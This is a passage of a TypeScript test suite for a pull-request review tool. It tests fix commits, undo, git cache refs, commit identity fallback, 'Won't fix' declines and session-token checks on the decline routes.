      expect(fixed).toMatchObject({ status: "discarded", revision: 1 });
      // The draft that the commit replaced comes back. The Fixed in draft of the undone commit cannot come back.
      expect(s.items()[0]).toMatchObject({ id: s.draft, status: "new", revision: 2 });
      for (const action of ["restore", "accept"]) {
        const back = await s.call<{ error: string }>("POST", `/api/items/${fixed?.id}`, { action, revision: 1 });
        expect([back.status, back.body.error]).toEqual([
          409,
          "The fix commit was undone, so this draft cannot post. Draft the reply again.",
        ]);
      }
      expect((await s.call<ReviewItemDto[]>("GET", `/api/prs/${s.id}/reply-drafts`)).body.map((i) => i.id)).toEqual([s.draft]);
      // The undone row frees its key.
      const again = await s.apply(s.ids);
      expect(again.status).toBe(201);
      expect(again.body.id).not.toBe(r.body.id);
    },
    SLOW,
  );

  test(
    "finding edits (fix-ux.md decision 3): no Fixed in reply, the findings close with the fixed mark and leave the post plan; Undo restores them",
    async () => {
      for (const m of ["fix-routes", "jobs"])
        console.log(`fix-ux WP3 imports ${Bun.resolveSync(`../../src/server/review/${m}`, import.meta.dir)}`);
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const { id: review } = s.db
        .query(
          `INSERT INTO review_run (pr, kind, profile, note, idem_key, source_head, target_head, merge_base, status, started_at, finished_at)
          VALUES ($pr, 'review', 'general', '', 'review', $s, $t, $b, 'completed', 1, 2) RETURNING id`,
        )
        .get({ pr: s.id, s: heads.source, t: heads.main, b: heads.base }) as { id: number };
      const excerpt = [{ n: 1, kind: "add", text: "# Sample" }];
      const anchor = { state: "exact", path: "README.md", oldPath: null, line: 1, lineEnd: 1, excerpt };
      const finding = (status: string) => {
        const payload = {
          path: "README.md",
          side: "new",
          line: 1,
          lineEnd: null,
          anchorText: "# Sample",
          severity: "minor",
          category: "Docs",
          body: `Rename the title (${status}).`,
          evidence: "E.",
          evidenceStatus: "code",
          confidence: "high",
          agent: null,
          anchor,
        };
        return (
          s.db
            .query(
              `INSERT INTO review_item (run, kind, payload_json, body, path, side, line, line_end, anchor_state, excerpt_json, status)
              VALUES ($run, 'finding', $payload, $body, 'README.md', 'new', 1, 1, 'exact', $excerpt, $status) RETURNING id`,
            )
            .get({ run: review, payload: JSON.stringify(payload), body: payload.body, status, excerpt: JSON.stringify(excerpt) }) as {
            id: number;
          }
        ).id;
      };
      const accepted = finding("accepted");
      const fresh = finding("new");
      const edits = [s.edit(EDITS[2] as (typeof EDITS)[number], null, accepted), s.edit(EDITS[1] as (typeof EDITS)[number], null, fresh)];
      const findings = () =>
        (
          s.db.query("SELECT id, status, revision, payload_json FROM review_item WHERE kind = 'finding' ORDER BY id").all() as {
            id: number;
            status: string;
            revision: number;
            payload_json: string;
          }[]
        ).map((r) => ({ id: r.id, status: r.status, revision: r.revision, fixed: JSON.parse(r.payload_json).fixed }));
      const planned = async () =>
        (await s.call<{ posts: { items: { id: number }[] }[] }>("GET", `/api/prs/${s.id}/post-plan`)).body.posts.flatMap((p) =>
          p.items.map((i) => i.id),
        );
      expect(await planned()).toEqual([accepted]);
      const replies = s.items();
      const sent: unknown[] = [];
      const broadcast = s.live.broadcast;
      s.live.broadcast = (event, data) => {
        sent.push([event, data]);
        broadcast(event, data);
      };

      const r = await s.apply(edits);
      expect(r.status).toBe(201);
      const head = await cg(clone, ["rev-parse", "HEAD"]);
      expect(sent).toEqual([["changed", { prs: [s.id], runs: [s.run, review] }]]);
      // No thread edit: the reply draft of thread ROOT stays, and no Fixed in reply appears.
      expect(s.items()).toEqual(replies);
      const mark = (was: string) => ({ id: r.body.id, commit: head, short: r.body.short, was });
      expect(findings()).toEqual([
        { id: accepted, status: "discarded", revision: 1, fixed: mark("accepted") },
        { id: fresh, status: "discarded", revision: 1, fixed: mark("new") },
      ]);
      expect(await planned()).toEqual([]);

      // The user restores both findings. Each gets its earlier status back and keeps the mark.
      const restore = await s.call<{ status: string }>("POST", `/api/items/${fresh}`, { action: "restore", revision: 1 });
      expect([restore.status, restore.body.status]).toEqual([200, "new"]);
      const back = await s.call<{ status: string; payload: { fixed?: unknown } }>("POST", `/api/items/${accepted}`, {
        action: "restore",
        revision: 1,
      });
      expect([back.status, back.body.status, back.body.payload.fixed]).toEqual([200, "accepted", mark("accepted")]);
      expect(await planned()).toEqual([accepted]);

      sent.length = 0;
      const u = await s.undo(r.body.id);
      expect([u.status, u.body.state]).toEqual([200, "undone"]);
      expect(sent).toEqual([["changed", { prs: [s.id], runs: [s.run, review] }]]);
      expect(findings()).toEqual([
        { id: accepted, status: "accepted", revision: 3, fixed: undefined },
        { id: fresh, status: "new", revision: 3, fixed: undefined },
      ]);
      expect(await planned()).toEqual([accepted]);
      expect(s.items()).toEqual(replies);
    },
    SLOW,
  );
});

describe("cache mode", () => {
  test(
    "the app branch commit has parent S; git fetch and merge --ff-only in a clone at S keep the hash; Undo deletes the ref",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply([s.ids[0] as number, s.ids[1] as number], "cache");
      expect(r.status).toBe(201);
      expect(r.body).toMatchObject({ mode: "cache", state: "committed", branch: null, before: heads.source });
      const ref = `refs/rl/${PR_REF.id}/fix-commit/${r.body.id}`;
      expect(r.body.fetch).toEqual({ cache: s.cache.replaceAll("\\", "/"), ref });
      const cache = (args: string[]) => git([`--git-dir=${s.cache}`, ...args], { env: setupEnv }).then((o) => o.trim());
      expect(await cache(["rev-parse", ref])).toBe(r.body.commit as string);
      expect(await cache(["rev-parse", `${ref}^`])).toBe(heads.source);
      expect(await cache(["log", "-1", "--format=%an <%ae>|%B", ref])).toBe(
        "Clone User <clone@example.test>|Fix review comment 1000003 on PR 2",
      );
      // The fix run keeps its head at refs/rl/<pr>/fix/<run>. The commit ref never replaces it.
      expect(ref.startsWith(`refs/rl/${PR_REF.id}/fix/`)).toBe(false);

      await cg(clone, ["fetch", "-q", r.body.fetch?.cache as string, ref]);
      await cg(clone, ["merge", "-q", "--ff-only", "FETCH_HEAD"]);
      expect(await cg(clone, ["rev-parse", "HEAD"])).toBe(r.body.commit as string);
      await cg(clone, ["reset", "-q", "--keep", heads.source]);

      const u = await s.undo(r.body.id);
      expect([u.status, u.body.state, u.body.fetch]).toEqual([200, "undone", null]);
      expect(await cache(["for-each-ref", ref])).toBe("");
    },
    SLOW,
  );

  test(
    "without a clone, the identity comes from the global config; without one there, 409 identity",
    async () => {
      const s = await setup();
      const none = await s.apply([s.ids[2] as number], "cache");
      expect([none.status, none.body.problems?.map((p) => p.kind)]).toEqual([409, ["identity"]]);
      writeFileSync(join(process.env.HOME as string, ".gitconfig"), "[user]\n\tname = Global User\n\temail = global@example.test\n");
      try {
        const r = await s.apply([s.ids[2] as number], "cache");
        expect(r.status).toBe(201);
        expect(
          (await git([`--git-dir=${s.cache}`, "log", "-1", "--format=%an <%ae>", r.body.commit as string], { env: setupEnv })).trim(),
        ).toBe("Global User <global@example.test>");
      } finally {
        rmSync(join(process.env.HOME as string, ".gitconfig"), { force: true });
      }
    },
    SLOW,
  );
});

// docs/plans/thread-outcome.md WP-S2: the Fixed in text, a partial commit, and "Don't fix" with its undo.
describe("thread outcome", () => {
  const NOTE = { thread: ROOT, fixed: true, reason: "R.", why: null, reply: "The lock now releases in finally." };
  const notes = (s: Awaited<ReturnType<typeof setup>>, list: unknown[]) =>
    s.db.query("UPDATE review_run SET fix_json = $j WHERE id = $id").run({ id: s.run, j: JSON.stringify(list) });
  const payloadOf = (row: { payload_json: string } | undefined) => JSON.parse(row?.payload_json ?? "{}") as ReplyPayload;
  const record = (s: Awaited<ReturnType<typeof setup>>) => {
    const sent: unknown[] = [];
    const broadcast = s.live.broadcast;
    s.live.broadcast = (event, data) => {
      sent.push([event, data]);
      broadcast(event, data);
    };
    return sent;
  };

  test(
    "Fixed in X: <what> keeps the untouched answer; a partial commit says Partly fixed and proposes no resolve; the rest completes it",
    async () => {
      const s = await setup();
      notes(s, [NOTE]);
      expect((await s.setClone(await makeClone())).status).toBe(200);
      const r1 = await s.apply([s.ids[0] as number], "cache");
      expect(r1.status).toBe(201);
      const [draft, partly] = s.items();
      expect(draft).toMatchObject({ id: s.draft, status: "discarded" });
      expect(partly).toMatchObject({
        status: "new",
        body: `Will do.\n\nPartly fixed in ${r1.body.short}: The lock now releases in finally.`,
      });
      expect(payloadOf(partly)).toMatchObject({ resolve: false, resolveEvidence: "", resolveTick: false, origin: "fix" });
      expect(payloadOf(partly).fix).toEqual({ id: r1.body.id, commit: r1.body.commit as string, replaced: [s.draft] });

      // A commit holds a part of the fix, so Don't fix is refused.
      const refused = await s.call<{ error: string }>("POST", "/api/fix-declines", { run: s.run, thread: ROOT, reason: "No." });
      expect([refused.status, refused.body.error]).toEqual([409, "A fix commit holds this fix. Undo the commit first."]);

      // The rest of the edits completes the fix. The Partly fixed draft is no answer, so the new draft holds only the line.
      const r2 = await s.apply([s.ids[1] as number, s.ids[2] as number], "cache");
      expect(r2.status).toBe(201);
      const full = s.items().at(-1);
      expect(full).toMatchObject({ status: "new", body: `Fixed in ${r2.body.short}: The lock now releases in finally.` });
      expect(payloadOf(full)).toMatchObject({
        resolve: true,
        resolveEvidence: `Commit ${r2.body.short} changes docs/flush.md, README.md.`,
      });
      expect(s.items().find((i) => i.id === partly?.id)).toMatchObject({ status: "discarded" });
    },
    SLOW,
  );

  test(
    "Don't fix on a thread: an unaccepted Won't fix draft and a stored fold that blocks Apply; Undo brings the proposal and the draft back",
    async () => {
      const s = await setup();
      notes(s, [NOTE]);
      const sent = record(s);
      const decline = (body: unknown) => s.call<{ error: string }>("POST", "/api/fix-declines", body);
      const undecline = (body: unknown) => s.call<{ error: string }>("POST", "/api/fix-declines/undo", body);
      const declinedNote = async () =>
        (await s.call<FixDto[]>("GET", `/api/prs/${s.id}/fixes`)).body.find((f) => f.run.id === s.run)?.threads[0]?.declined;

      for (const bad of [
        { run: s.run, reason: "x" },
        { run: s.run, thread: ROOT, finding: 1, reason: "x" },
        { run: s.run, thread: ROOT, reason: " " },
      ])
        expect((await decline(bad)).status).toBe(400);
      const missing = await decline({ run: s.run, thread: 999, reason: "x" });
      expect([missing.status, missing.body.error]).toEqual([404, "Fix note not found."]);
      expect(sent).toEqual([]);

      expect((await decline({ run: s.run, thread: ROOT, reason: "Out of scope here." })).status).toBe(204);
      expect(sent).toEqual([["changed", { prs: [s.id], runs: [s.run] }]]);
      const [draft, wont] = s.items();
      expect(draft).toMatchObject({ id: s.draft, status: "discarded" });
      expect(wont).toMatchObject({ status: "new", body: "Won't fix: Out of scope here." });
      expect(payloadOf(wont)).toMatchObject({
        origin: "nofix",
        declined: { run: s.run },
        resolve: false,
        resolveTick: false,
        replyTo: s.newest(),
        threadOpen: true,
      });
      // The fold is stored: a new request reads it, and Apply refuses the declined edits.
      expect(await declinedNote()).toEqual({ reason: "Out of scope here.", draft: wont?.id as number, replaced: [s.draft] });
      expect((await s.call<ReviewItemDto[]>("GET", `/api/prs/${s.id}/reply-drafts`)).body.map((i) => i.id)).toEqual([wont?.id as number]);
      const blocked = await s.apply(s.ids, "cache");
      expect([blocked.status, blocked.body.error]).toEqual([409, `You declined the fix of thread ${ROOT}. Undo the decline first.`]);
      expect(s.db.query("SELECT COUNT(*) AS n FROM fix_commit").get()).toEqual({ n: 0 });
      const again = await decline({ run: s.run, thread: ROOT, reason: "Again." });
      expect([again.status, again.body.error]).toEqual([409, "You declined this fix already."]);

      sent.length = 0;
      expect((await undecline({ run: s.run, thread: ROOT })).status).toBe(204);
      expect(sent).toEqual([["changed", { prs: [s.id], runs: [s.run] }]]);
      expect(await declinedNote()).toBeUndefined();
      const after = s.items();
      expect(after[0]).toMatchObject({ id: s.draft, status: "new" });
      expect(after[1]).toMatchObject({ id: wont?.id, status: "discarded" });
      expect(payloadOf(after[1]).declined).toBeNull();
      const twice = await undecline({ run: s.run, thread: ROOT });
      expect([twice.status, twice.body.error]).toEqual([409, "This fix is not declined."]);
    },
    SLOW,
  );

  test(
    "Don't fix on a finding discards it with the reason and makes no draft; Undo gives its status back",
    async () => {
      const s = await setup();
      const { id: review } = s.db
        .query(
          `INSERT INTO review_run (pr, kind, profile, note, idem_key, source_head, target_head, status, started_at, finished_at)
          VALUES ($pr, 'review', 'general', '', 'review', 's', 't', 'completed', 1, 2) RETURNING id`,
        )
        .get({ pr: s.id }) as { id: number };
      const { id: finding } = s.db
        .query(
          `INSERT INTO review_item (run, kind, payload_json, body, path, side, line, line_end, anchor_state, status)
          VALUES ($run, 'finding', '{"body":"B."}', 'B.', 'README.md', 'new', 1, 1, 'exact', 'accepted') RETURNING id`,
        )
        .get({ run: review }) as { id: number };
      notes(s, [{ finding, fixed: true, reason: "R.", why: null, reply: "" }]);
      const row = () =>
        s.db
          .query("SELECT status, json_extract(payload_json, '$.declined') AS declined FROM review_item WHERE id = $id")
          .get({ id: finding });
      const sent = record(s);
      const replies = s.items();
      expect((await s.call("POST", "/api/fix-declines", { run: s.run, finding, reason: "Not worth it." })).status).toBe(204);
      expect(sent).toEqual([["changed", { prs: [s.id], runs: [s.run, review] }]]);
      expect(row()).toEqual({ status: "discarded", declined: JSON.stringify({ run: s.run, reason: "Not worth it.", was: "accepted" }) });
      expect(s.items()).toEqual(replies);
      expect((await s.call("POST", "/api/fix-declines/undo", { run: s.run, finding })).status).toBe(204);
      expect(row()).toEqual({ status: "accepted", declined: null });
    },
    SLOW,
  );

  test(
    "the decline routes need the session token",
    async () => {
      const s = await setup();
      notes(s, [NOTE]);
      const { "x-rl-session": _, ...headers } = HEADERS;
      for (const path of ["/api/fix-declines", "/api/fix-declines/undo"])
        expect((await s.call("POST", path, { run: s.run, thread: ROOT, reason: "x" }, headers)).status).toBe(403);
      expect(s.items()).toHaveLength(1);
    },
    SLOW,
  );
});
